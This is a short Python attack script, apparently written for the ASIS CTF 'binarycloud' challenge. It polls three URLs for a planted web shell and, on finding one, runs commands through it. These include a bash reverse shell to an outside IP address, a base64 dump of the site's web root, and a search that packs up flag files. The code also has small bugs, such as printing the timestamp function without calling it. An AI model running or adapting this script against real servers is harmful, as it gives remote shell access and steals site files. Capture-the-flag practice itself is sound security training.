urls = 'https://binarycloud.asis-ctf.ir/cache/index.php https://binarycloud.asis-ctf.ir/cache/upload.php https://binarycloud.asis-ctf.ir/debug.php'

import requests
from time import sleep
from urllib.parse  import quote

from time import localtime, strftime
def timestamp():
    return strftime('%Y-%m-%d %H:%M:%S', localtime())

def run(url, cmd):
    u = '%s?cmd=%s' % (url, quote(cmd))
    r = requests.get(u)
    print('%s' % timestamp)
    print('%r' % r.content)


while True:
    for url in urls.split(' '):
        u = '%s?cmd=id' % url
        r = requests.get(u)
        if 'uid=' in r.content:
            print('Woot %s %r' % (u, r.content))

            run(url, 'bash -i >& /dev/tcp/212.83.174.121/80 0>&1')
            run(url, 'tar cf - /home/binarycloud/www|base64')
            run(url, "find /-iname '*flag*' 2>/dev/null|xargs tar cf -|base64")

        sleep(10)
    sleep(30)
